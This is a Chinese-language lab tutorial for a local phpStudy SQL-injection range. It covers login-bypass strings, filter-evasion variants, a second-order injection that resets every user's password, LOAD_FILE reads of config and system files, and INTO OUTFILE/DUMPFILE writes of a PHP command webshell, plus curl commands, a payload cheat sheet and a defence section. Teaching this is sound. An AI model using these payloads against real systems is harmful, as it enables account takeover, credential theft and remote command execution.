# SQL 注入补充实验：万能密码、二阶注入、文件读写

> 环境：Windows 10 / 11 + 小皮面板（phpStudy v8）+ WAMP + PHP 7.4 + MySQL 5.7
> 只在 `localhost` 的本机靶场使用，别把 payload 指向别人的站点。

三组实验，一条主线：**输入在什么地方变成 SQL 代码**。

1. 登录框里的万能用户名 / 万能密码——一次拼接就生效。
2. 二阶注入——第一次入库很安全，第二次从库里取出来再拼接时才生效。
3. 注入后的文件读写——`LOAD_FILE()` 读源码，`INTO OUTFILE` 写 webshell。

每个页面都会把**实际执行的 SQL**打印出来。看 SQL，比背 payload 有用。

---

## 0. 用小皮面板部署

### 0.0 装小皮面板（已经装好可跳过）

1. 下载 phpStudy v8（小皮面板），默认装到 `C:\phpstudy_pro`。
2. 打开面板，一键启动 **Apache + MySQL**。
3. 环境 → PHP 版本选 **7.4**（7.1 以上都能跑）。
4. 数据库页面确认 root 密码，默认是 `root`。

### 0.1 页面与知识点

| 页面 | 演示内容 |
|---|---|
| `login/level1.php` | 万能密码、万能用户名、注释符 |
| `login/level2.php` | 括号闭合：`')` |
| `login/level3.php` | 过滤空格 / `or` / `and` / `--` 的绕过 |
| `login/level4.php` | 密码先 `md5()`，注入点位置决定成败 |
| `login/safe.php` | 预处理对照 |
| `second/register.php` | 二阶注入第一步：payload 安全入库 |
| `second/login.php` | 第二步：正常登录 |
| `second/change.php` | 第三步：库里的用户名被拼进 UPDATE，全表改密 |
| `second/safe.php` | 同样的流程，但拼接处用占位符 |
| `second/reset.php` | 重置演示数据 |
| `article.php?id=` | 数字型 3 列注入点，文件读写都打这里 |
| `probe.php` | 查 FILE 权限、`secure_file_priv`、目录写权限 |
| `install.php` | 建库、导入数据、跑一遍读写实测 |

### 0.2 目录结构

```
sqli/
├── README.md
├── install.php            安装 + 环境自检（会 DROP 旧库）
├── config.php             数据库账号、路径、页面骨架、SQL 回显
├── index.php              导航 + 速查表
├── article.php            数字型注入点
├── probe.php              环境自检
├── style.css
├── login/                 万能密码五页
├── second/                二阶注入五页
├── upload/                webshell 落地目录
└── sql/init.sql           建库建表，install.php 会读取它
```

整个 `sqli` 目录就是站点根目录，直接复制到网站根目录即可，不需要再拆 `src`。

### 0.3 部署（两种方式，任选）

**方式 A：直接放到默认站点下**

1. 把小皮面板的网站根目录（通常是 `C:\phpstudy_pro\WWW`）打开。
2. 把整个 `sqli` 文件夹复制进去，得到 `C:\phpstudy_pro\WWW\sqli`。
3. 启动 Apache 和 MySQL，PHP 版本选 **7.4**（7.1 以上都能跑）。
4. 浏览器访问 `http://localhost/sqli/install.php`。

**方式 B：新建一个独立站点**

1. 小皮面板 → 网站 → 创建网站。
2. 域名填 `sqli.test`，根目录选到 `...\WWW\sqli`，PHP 选 7.4。
3. 保存后访问 `http://sqli.test/install.php`。

`config.php` 会自动识别 URL 前缀，方式 A 是 `/sqli`，方式 B 是空，链接和样式都不会坏。

> 下文所有 URL 都以方式 A 的 `/sqli` 为例；用方式 B 的话，把 URL 里的 `/sqli` 去掉即可。

### 0.4 数据库账号

小皮面板默认是 `root / root`，`config.php` 里已按这个填好：

```php
const DB_HOST = 'localhost';
const DB_USER = 'root';
const DB_PASS = 'root';
const DB_NAME = 'sqli_lab';
```

如果你装的时候改过 root 密码，或者用的是空密码，改这里再访问 `install.php`。

> 靶场用 root 是为了省事：它自带 `FILE` 权限，文件读写实验不用额外授权。真实项目里应用账号绝不能这么给。

### 0.5 关键配置：`secure_file_priv`

MySQL 默认可能禁止在任意目录读写文件，表现是 `LOAD_FILE()` 返回 NULL、`INTO OUTFILE` 报 `--secure-file-priv` 错误。

在小皮面板里改：

1. 数据库 → 配置（或直接打开 `C:\phpstudy_pro\Extensions\MySQL5.7.26\my.ini`，版本号按实际目录）。
2. 在 `[mysqld]` 段里加一行；如果已经有这一行，改成空值，不要写两行：

```ini
[mysqld]
secure_file_priv=""
```

3. 回到面板重启 MySQL。

| 取值 | 含义 |
|---|---|
| 空字符串 `""` | 不限制目录（本实验需要） |
| 某个目录，如 `C:/mysql-files` | 只能读写这个目录 |
| `NULL` | 文件导入导出整体禁用 |

改完访问 `install.php`，看到“`secure_file_priv`：空”和“写文件实测：成功”再往下做。

> Windows 路径在 SQL 里统一用正斜杠：`C:/phpstudy_pro/WWW/sqli/upload/cmd.php`。反斜杠 `\` 在 SQL 字符串里是转义符，写单个 `\` 会把后面的字符吃掉。

### 0.6 安装验收

`install.php` 会打印一张表，重点看四行：

| 检查项 | 期望 |
|---|---|
| `secure_file_priv` | 空（不限制目录） |
| `FILE 权限` | 有 |
| `写文件实测` | 成功 |
| `读 C:/Windows/win.ini` | 成功，几百字节 |

任何一项失败，按页面上的提示改 `my.ini` 或账号权限，再刷新。

如果之前装过，直接再访问一次 `install.php` 就是重装：会 DROP 掉 `sqli_lab`，演示数据回到初始状态。

> 验收通过后，如果不想让别人在浏览器里重装（会清库），可以把 `install.php` 改名或删掉；需要重装时再放回来。这是“安装脚本不要留在生产目录”的最小示范。

---

## 1. 万能用户名与万能密码

### 1.1 漏洞的根：程序只问“有没有行”

`level1.php` 的核心：

```php
$sql = "SELECT id, username, role FROM users WHERE username = '$username' AND password = '$password'";
$res = $db->query($sql);
$user = $res->fetch_assoc();     // 拿到行就算登录成功
```

程序把“查到了记录”等同于“密码正确”。只要让 `WHERE` 恒真，或者让密码条件消失，就能拿到一行。

### 1.2 拆解 `' OR 1=1 -- -`

用户名填 `' OR 1=1 -- -`，密码随便：

```sql
SELECT id, username, role FROM users
WHERE username = '' OR 1=1 -- -' AND password = 'x'
```

| 片段 | 作用 |
|---|---|
| `'` | 闭合 `username = '` 留下的引号，让后面变成 SQL 代码 |
| ` OR 1=1` | 恒真条件，整条 `WHERE` 不再看用户名密码 |
| `-- -` | 注释掉尾巴 `' AND password = 'x'` |

MySQL 要求 `--` 后面跟一个空白才算注释，所以写 `-- -`。`#` 也是注释，且不需要空格。

### 1.3 为什么 `' OR '1'='1` 经常不灵

因为 **`AND` 的优先级高于 `OR`**：

```sql
-- 输入：' OR '1'='1      密码：x
WHERE username = '' OR '1'='1' AND password = 'x'
-- 等价于
WHERE username = '' OR ('1'='1' AND password = 'x')
```

`'1'='1'` 为真，但 `password = 'x'` 为假，`真 AND 假 = 假`，整条为假。

| 输入 | 实际 `WHERE` | 结果 |
|---|---|---|
| `' OR '1'='1`（密码填 `x`） | `username='' OR ('1'='1' AND password='x')` | 失败 |
| `' OR '1'='1`（密码留空） | `username='' OR ('1'='1' AND password='')` | 成功 |
| `' OR '1'='1' -- -` | `username='' OR '1'='1'` | 成功 |
| `' OR 1=1 #` | `username='' OR 1=1` | 成功 |

不是 payload 错，是尾巴没处理干净。

### 1.4 万能用户名：`admin' -- -`

`OR 1=1` 拿到的是表里的第一行，不一定是 admin。想指定账号：

```sql
-- 用户名：admin' -- -    密码随便
SELECT id, username, role FROM users
WHERE username = 'admin' -- -' AND password = 'x'
```

密码判断被整段注释，直接以 admin 身份登录。换成 `alice' -- -` 就是 alice。

| 类型 | Payload | 特点 |
|---|---|---|
| 万能密码 | `' OR 1=1 -- -` | 不依赖用户名，拿表里第一行 |
| 万能密码（限行） | `' OR 1=1 LIMIT 1 -- -` | 代码只取一行时更稳 |
| 万能用户名 | `admin' -- -` | 精准登录指定账号 |
| 万能用户名（变体） | `admin'#` | `#` 代替 `-- `，少一个空格 |

### 1.5 闭合方式跟着 SQL 走

| 代码里的写法 | 闭合方式 | 示例 |
|---|---|---|
| `username = '$u'` | `'` | `' OR 1=1 -- -` |
| `username = ('$u')` | `')` | `') OR 1=1 -- -` |
| `username = "$u"` | `"` | `" OR 1=1 -- -` |
| `username LIKE '%$u%'` | `%'` | `%' OR 1=1 -- -` |
| `id = $id`（数字型） | 不需要引号 | `1 OR 1=1` |

`level2.php` 是第二种。只写 `admin' -- -` 会因为少一个 `)` 直接语法报错。

### 1.6 过滤空格和关键字怎么绕

`level3.php` 的过滤：

```php
$username = str_ireplace([' ', "\t", "\n", "\r", 'or', 'and', '--'], '', $username);
```

删掉了空格、`or`、`and`、`--`。换同义写法，并保证 payload 不含空格：

```sql
-- 输入：'||1=1#    密码随便
WHERE username = ''||1=1#' AND password = 'x'
```

- `||` 是逻辑或，等价于 `or`；
- `#` 注释掉后面的 `' AND password = ...`，不需要空格；
- 整条没有空格，过滤规则碰不到。

| 被过滤 | 替代 |
|---|---|
| 空格 | `/**/`、`%09`（Tab）、`%0a`（换行） |
| `or` | `\|\|` |
| `and` | `&&` |
| `--` | `#`、`/* */` |
| `union select` | 大小写混写、`/**/` 分隔（视过滤实现） |

### 1.7 密码先 md5 的情况

`level4.php`：

```php
$hash = md5($password);
$sql  = "SELECT ... WHERE username = '$username' AND password = '$hash'";
```

- 用户名框填 `' OR 1=1 -- -`：有效，注入发生在 md5 之前。
- 密码框填同样的 payload：无效，`md5("' OR 1=1 -- -")` 变成一串十六进制，只是普通字符串。

结论：注入只看**变量进 SQL 时是什么形态**。md5 是加密，不是过滤。

### 1.8 正确写法对照

`login/safe.php`：

```php
$stmt = $db->prepare('SELECT id, username, role FROM users WHERE username = ? AND password = ?');
$stmt->bind_param('ss', $username, $password);
$stmt->execute();
```

值只参与比较，不参与拼接。`' OR 1=1 -- -` 只是一个很长的用户名，查不到。

生产环境还要：密码用 `password_hash()` 存、`password_verify()` 校验；表名、列名、`ORDER BY` 方向走白名单。

### 1.9 打不进去时排查

| 现象 | 原因 |
|---|---|
| 提示密码错误，SQL 正常 | 注释没加，`AND` 优先级把条件算假了 |
| 报 SQL 语法错误 | 引号 / 括号没闭合，或注释少写 |
| 引号变成 `\'` | 开了 `addslashes` / `mysqli_real_escape_string` |
| 密码框无效、用户名框有效 | 密码被 md5 / hash 了 |
| 查到行但仍未登录 | 代码又比对了密码或角色 |
| 页面完全不回显 | 盲注场景，不在本文范围 |

---

## 2. 二阶注入

### 2.1 一句话理解

payload 分两次走：

```text
第一次（写入）：用户输入 --预处理--> 数据库     payload 只是普通字符串
第二次（读取）：数据库    --拼接-->  SQL 执行    payload 在这里变成代码
```

危险的不是入口，而是**“从数据库读出来的数据被当成可信数据”**。

### 2.2 完整实验流程

**① 注册**

打开 `second/register.php`，填：

```text
用户名：hacker' OR 1=1#
密码：  123456
```

注册会成功。页面会显示数据库里实际存的值：

```text
[hacker' OR 1=1#]
```

单引号完整保留，没有被转义。因为写库用的是预处理：

```sql
INSERT INTO users (username, password, role) VALUES (?, ?, ?)
```

**② 登录**

打开 `second/login.php`，用同一个用户名和密码登录。登录也是预处理：

```sql
SELECT id, username, role FROM users WHERE username = ? AND password = ?
```

带引号的用户名照样能匹配，因为它是作为“值”去比较的。

**③ 改密码，第二阶触发**

登录后进入 `second/change.php`。这个页面先从库里按 id 取出用户名，再拼进 UPDATE：

```php
$stmt = $db->prepare('SELECT username FROM users WHERE id = ?');   // 第一阶，安全
...
$sql = "UPDATE users SET password = '$newPassword' WHERE username = '$storedName'";  // 第二阶，拼了
```

把新密码填成 `pwned123`，执行后实际 SQL 是：

```sql
UPDATE users SET password = 'pwned123' WHERE username = 'hacker' OR 1=1#'
```

`#` 注释掉末尾的 `'`，`OR 1=1` 让 `WHERE` 恒真，于是**整张 users 表都被更新**。页面会显示“受影响行数：4”（3 个种子账号 + hacker）。

**④ 验证**

退出登录，用 `admin / pwned123` 去 `login/level1.php` 登录，成功——说明 admin 的密码也被改了。

**⑤ 重置**

打开 `second/reset.php`，点“确认重置”，删除 id > 3 的测试账号，恢复 admin / alice / bob 的初始密码。

### 2.3 为什么第一阶挡不住

| 阶段 | 代码 | 是否安全 |
|---|---|---|
| 注册 | `INSERT ... VALUES (?, ?, ?)` | 安全，payload 只是数据 |
| 登录 | `SELECT ... WHERE username = ?` | 安全 |
| 改密码（取用户名） | `SELECT username WHERE id = ?` | 安全 |
| 改密码（拼接） | `UPDATE ... WHERE username = '$stored'` | **不安全** |

前三次都没问题，问题在最后一次：变量来自数据库，代码就默认它可信。数据库只是存储，不是消毒柜。

### 2.4 正确写法

拼接的地方照样用占位符：

```php
$sql  = 'UPDATE users SET password = ? WHERE username = ?';
$stmt = $db->prepare($sql);
$stmt->bind_param('ss', $newPassword, $storedName);
$stmt->execute();
```

`second/safe.php` 就是这一版。用同样的 `hacker' OR 1=1#` 登录后改密码，受影响行数只有 1。

二阶注入的修复原则：**每一个 sink 都要参数化**，包括从数据库、缓存、文件、API 读回来的数据。只在入口做过滤，等于只锁了前门。

### 2.5 真实场景里的变体

- 注册时填昵称 / 签名，后台审核页面把昵称拼进查询；
- 用户资料里的“公司名”，被导出报表的 SQL 拼接；
- API 写入的订单备注，被定时任务拼进统计 SQL；
- 管理员从旧系统导入的数据，被新系统直接拼接。

共同点：**payload 先落库，后在另一个功能点执行**。所以只测登录框是发现不了的。

### 2.6 排查清单

| 检查点 | 做法 |
|---|---|
| 所有 SQL 调用 | 搜 `query(`、`prepare(`、`exec(`，看有没有变量直接进字符串 |
| 数据来源 | 不只 `$_GET/$_POST`，还包括数据库字段、缓存、文件、第三方接口 |
| 二次拼接 | 同一个变量是否在另一个文件里又进了 SQL |
| 统一入口 | 所有查询走同一个 DAL，禁止业务代码手写拼接 |
| 回归测试 | 注册带引号的用户名，再把每个功能点走一遍 |

---

## 3. 文件读：`LOAD_FILE()`

### 3.1 三个前置条件

| 条件 | 查看方式 | 不满足时 |
|---|---|---|
| 账号有 `FILE` 权限 | `SHOW GRANTS FOR CURRENT_USER();` | `Access denied; you need the FILE privilege` |
| `secure_file_priv` 放行 | `SELECT @@secure_file_priv;` | 返回 NULL 或读不到 |
| mysqld 在系统层能读该文件 | 文件权限 / 服务账号 | `LOAD_FILE()` 返回 NULL |

`probe.php` 会把这三项和实测结果一起列出来，先看它。

### 3.2 UNION 读文件

`article.php` 的查询是数字型、固定 3 列：

```php
$sql = "SELECT id, title, content FROM articles WHERE id = $id";
```

三步：

```text
① 猜列数：?id=1 ORDER BY 4 报错、ORDER BY 3 正常 → 3 列
② 找显示位：?id=-1 UNION SELECT 1,2,3
③ 换载荷：?id=-1 UNION SELECT 1,2,LOAD_FILE('C:/Windows/win.ini')
```

`id=-1` 让第一条 SELECT 查不到行，页面只剩 UNION 注入的那一行。

浏览器直接访问：

```text
http://localhost/sqli/article.php?id=-1 UNION SELECT 1,2,LOAD_FILE('C:/Windows/win.ini')
```

命令行（Git Bash；CMD 没有 `grep`，这一步直接看浏览器即可）：

```bash
curl -s -G "http://localhost/sqli/article.php" \
  --data-urlencode "id=-1 UNION SELECT 1,2,LOAD_FILE('C:/Windows/win.ini')" \
  | grep -m3 'for 16-bit app support'
```

### 3.3 Windows 路径怎么写

| 写法 | 结果 |
|---|---|
| `C:/Windows/win.ini` | 正确，推荐 |
| `C:\\Windows\\win.ini` | 正确，双反斜杠转义 |
| `C:\Windows\win.ini` | 错误，`\W` 被当成转义 |
| `..\config.php` | 错误，`LOAD_FILE` 只认绝对路径 |

### 3.4 读什么最有价值

| 目标 | 路径 | 价值 |
|---|---|---|
| 站点配置 | `C:/phpstudy_pro/WWW/sqli/config.php` | 数据库账号密码 |
| MySQL 配置 | `C:/phpstudy_pro/Extensions/MySQL5.7.26/my.ini` | 数据目录、`secure_file_priv` |
| 系统文件 | `C:/Windows/win.ini` | 验证读权限 |
| hosts | `C:/Windows/System32/drivers/etc/hosts` | 内网资产 |
| Apache 配置 | `C:/phpstudy_pro/Extensions/Apache2.4.39/conf/httpd.conf` | `DocumentRoot`，为写文件找路径 |

读源码：

```text
?id=-1 UNION SELECT 1,2,LOAD_FILE('C:/phpstudy_pro/WWW/sqli/config.php')
```

`config.php` 里直接能看到 `DB_USER` / `DB_PASS`。如果 MySQL 端口对外开放，到这里就可以“注入 → 拿账号 → 直连数据库”。

### 3.5 乱码用 `HEX()`

```text
?id=-1 UNION SELECT 1,2,HEX(LOAD_FILE('C:/Windows/win.ini'))
```

页面得到十六进制字符串，复制出来解码：

```bash
php -r "echo hex2bin('3b20666f722031362d626974...');"
```

（有 `xxd` 的话也可以 `echo '...' | xxd -r -p`，或者直接丢进 CyberChef 的 From Hex。）

`HEX()` 会让体积翻倍；文件接近 `max_allowed_packet`（MySQL 5.7 默认 4 MB）时会截断或失败。

### 3.6 返回 NULL 的排查

| 现象 | 原因 |
|---|---|
| 显示位为空 | 路径不对、文件不存在、没权限 |
| 有 FILE 权限仍 NULL | 路径用了反斜杠 / `secure_file_priv` 限制 / 文件太大 |
| 读 `C:/Windows/win.ini` 也失败 | MySQL 服务账号读不了，或 `secure_file_priv` 不是空 |
| 读站点源码失败 | 文件不在该路径，先读 `httpd.conf` 确认 `DocumentRoot` |

---

## 4. 文件写：`INTO OUTFILE` / `INTO DUMPFILE`

### 4.1 两种写法

| 特性 | `INTO OUTFILE` | `INTO DUMPFILE` |
|---|---|---|
| 写入内容 | 结果每一行，字段用 Tab 分隔 | 只写一行，字段直接拼接，无分隔 |
| 转义 | 会转义 `\`、换行、Tab | 原样写入 |
| 适合 | 文本、webshell | 二进制、单行 payload |
| 覆盖 | 不允许 | 不允许 |
| 多行 | 支持 | 只允许一行 |

共同要求：`FILE` 权限、`secure_file_priv` 放行、**目标文件不存在**、目录对 mysqld 可写。

### 4.2 写一个 webshell

`upload/` 目录已经建好，路径按你的安装改。payload 放在第 3 列（`content`，TEXT）：

```text
?id=-1 UNION SELECT 1,2,'<?php system($_GET[0]);?>' INTO OUTFILE 'C:/phpstudy_pro/WWW/sqli/upload/cmd.php'
```

拼出来：

```sql
SELECT id, title, content FROM articles WHERE id = -1
UNION SELECT 1,2,'<?php system($_GET[0]);?>'
INTO OUTFILE 'C:/phpstudy_pro/WWW/sqli/upload/cmd.php'
```

课堂上最省事的是直接把下面这串贴进浏览器地址栏（空格浏览器会自己编码）：

```text
http://localhost/sqli/article.php?id=-1 UNION SELECT 1,2,'<?php system($_GET[0]);?>' INTO OUTFILE 'C:/phpstudy_pro/WWW/sqli/upload/cmd.php'
```

如果浏览器把 `<` `>` 转义弄坏了，用 URL 编码版：

```text
http://localhost/sqli/article.php?id=-1%20UNION%20SELECT%201%2C2%2C%27%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3B%3F%3E%27%20INTO%20OUTFILE%20%27C%3A/phpstudy_pro/WWW/sqli/upload/cmd.php%27
```

Git Bash 里执行（`$` 要转义，避免被 shell 展开；CMD / PowerShell 的引号规则不同，这一步建议直接用浏览器）：

```bash
curl -s -G "http://localhost/sqli/article.php" \
  --data-urlencode "id=-1 UNION SELECT 1,2,'<?php system(\$_GET[0]);?>' INTO OUTFILE 'C:/phpstudy_pro/WWW/sqli/upload/cmd.php'"
```

验证：

```bash
curl "http://localhost/sqli/upload/cmd.php?0=whoami"
```

预期：

```text
1	2	desktop-xxxx\administrator
```

开头的 `1`、`2`（Tab 分隔）是 UNION 前两列被一起写进文件的尾巴。PHP 把它们当普通文本输出，不影响 `<?php ... ?>` 执行。

为什么用 `$_GET[0]` 而不是 `$_GET['c']`：SQL 字符串用单引号包裹，PHP 代码里再出现单引号就要转义。用数字下标 `0` 可以完全避开引号，访问时就是 `cmd.php?0=whoami`。

### 4.3 引号被过滤：DUMPFILE + 十六进制

把 PHP 代码转成十六进制，payload 里就不出现引号（路径除外）：

```text
?id=-1 UNION SELECT 1,2,0x3c3f7068702073797374656d28245f4745545b305d293b3f3e INTO DUMPFILE 'C:/phpstudy_pro/WWW/sqli/upload/d.php'
```

`0x3c3f...` 就是 `<?php system($_GET[0]);?>`。生成：

```bash
php -r "echo '0x' . bin2hex('<?php system(' . chr(36) . '_GET[0]);?>');"
```

（`chr(36)` 就是 `$`，这样写 CMD 和 Git Bash 都不用处理美元符号的转义。）

`DUMPFILE` 不转义、不加分隔符，写进去就是原始字节。

### 4.4 写文件失败对照表

| 报错 / 现象 | 原因 | 处理 |
|---|---|---|
| `The MySQL server is running with the --secure-file-priv option...` | 目录不在白名单 | 改 `my.ini` 为 `secure_file_priv=""`，重启 MySQL |
| `File '...' already exists` | OUTFILE 不覆盖 | 换文件名 |
| `Can't create/write to file ... (Errcode: 13)` | 目录不可写 | 检查 upload 目录 ACL / MySQL 服务账号 |
| `Access denied; you need the FILE privilege` | 账号没 FILE | 用 root，或 `GRANT FILE ON *.* TO ...` |
| 写成功但访问 403 | 文件权限问题 | 看文件 ACL |
| 访问直接显示源码 | Apache 没挂 PHP | 小皮面板切换 PHP 版本后重启 Apache |
| 一句话执行报错 | 短标签被关 / 语法错 | 用 `<?php`，本地 `php -l` 先验 |
| 一句话没输出 | `disable_functions` 关了 `system` | 换 `assert`/`include` 或看 `php.ini`（仅靶场） |

### 4.5 写文件的边界

- 只能**新建**，不能覆盖 `C:/Windows/win.ini`、`hosts` 这类已存在文件；
- 以 mysqld 的服务账号写，目标目录要对它可写；
- 受 `secure_file_priv` 约束；
- Windows 文件名大小写不敏感，`CMD.php` 和 `cmd.php` 是同一个文件；
- 写进 Web 目录才有用，先用 `LOAD_FILE('C:/.../httpd.conf')` 确认 `DocumentRoot`。

---

## 5. 防御

| 攻击面 | 有效防御 |
|---|---|
| 登录处拼接 | 预处理；`password_hash` / `password_verify`；失败计数 |
| 数字型注入 | `(int)$id` 是补丁，根治还是参数化 |
| 二阶注入 | 所有 sink 参数化，包括库里的数据；统一 DAL |
| `LOAD_FILE` | 应用账号不授予 `FILE`；Web 与 DB 分机 |
| `INTO OUTFILE` | `secure_file_priv` 指向空目录或 NULL；Web 根目录对 mysqld 不可写 |
| webshell 执行 | 上传目录禁止执行 PHP；`open_basedir`；禁用危险函数 |
| 账号权限过大 | 每应用独立账号，只给本库 DML，禁用 `FILE`、`SUPER` |

回收 FILE：

```sql
REVOKE FILE ON *.* FROM 'app'@'localhost';
```

配置里收紧：

```ini
[mysqld]
secure_file_priv=C:/mysql-files
```

不需要导入导出就设成 `NULL`。

WAF 能挡 `' OR 1=1`，挡不住 `'||1=1#`，更挡不住已经存进库里的二阶 payload。**参数化查询才是分界线**。

---

## 6. 速查 payload

`article.php` 的 `id` 参数（3 列、数字型）：

| 目的 | Payload |
|---|---|
| 猜列数 | `1 ORDER BY 4` |
| 找显示位 | `-1 UNION SELECT 1,2,3` |
| 当前库 / 用户 | `-1 UNION SELECT 1,database(),user()` |
| 读文件 | `-1 UNION SELECT 1,2,LOAD_FILE('C:/Windows/win.ini')` |
| 读文件（HEX） | `-1 UNION SELECT 1,2,HEX(LOAD_FILE('C:/Windows/win.ini'))` |
| 查环境 | `-1 UNION SELECT 1,@@secure_file_priv,@@datadir` |
| 写 shell | `-1 UNION SELECT 1,2,'<?php system($_GET[0]);?>' INTO OUTFILE 'C:/phpstudy_pro/WWW/sqli/upload/cmd.php'` |
| 写 shell（十六进制） | `-1 UNION SELECT 1,2,0x3c3f7068702073797374656d28245f4745545b305d293b3f3e INTO DUMPFILE 'C:/phpstudy_pro/WWW/sqli/upload/d.php'` |

登录框：

| 场景 | Payload |
|---|---|
| 单引号包裹 | `' OR 1=1 -- -` |
| 指定账号 | `admin' -- -` |
| 括号包裹 | `') OR 1=1 -- -` |
| 过滤空格 / or / `--` | `'\|\|1=1#` |
| 二阶（注册时填） | `hacker' OR 1=1#` |

> `#` 放在 URL 里要写成 `%23`；用表单 POST 提交则不用管。二阶 payload 是表单提交，原样输入即可。

---

## 8. 重置与卸载

- 重置数据：访问 `second/reset.php`，或重新访问 `install.php`（会 DROP 整个库）。
- 卸载：删掉 `C:\phpstudy_pro\WWW\sqli` 目录，删掉 `sqli_lab` 数据库，把 `my.ini` 里的 `secure_file_priv=""` 改回去并重启 MySQL。

---

## 附：Windows + PHP 7 容易踩的坑

- **反斜杠**：SQL 字符串里 `\` 是转义符，路径统一写 `C:/...`。
- **`secure_file_priv` 默认不是空**：不改成空，`LOAD_FILE` / `INTO OUTFILE` 一定失败。
- **OUTFILE 不覆盖**：重复演示前删文件或换名。
- **文件名大小写**：Windows 不区分，`cmd.php` 和 `CMD.php` 是同一个。
- **PHP 7 与 8 的差异**：PHP 8.1+ 的 mysqli 默认抛异常；本代码在 PHP 7 下 `query()` 返回 false。换到 PHP 8 要显式 `mysqli_report(MYSQLI_REPORT_OFF)`（`config.php` 已经写了，两个版本都能跑）。
- **切 PHP 版本**：小皮面板切完要重启 Apache 才生效。
- **文件已存在**：`install.php` 的写测试用的是随机文件名，不会撞。
- **访问 shell 显示源码**：说明 Apache 没解析 PHP，检查面板里的 PHP 版本和模块。
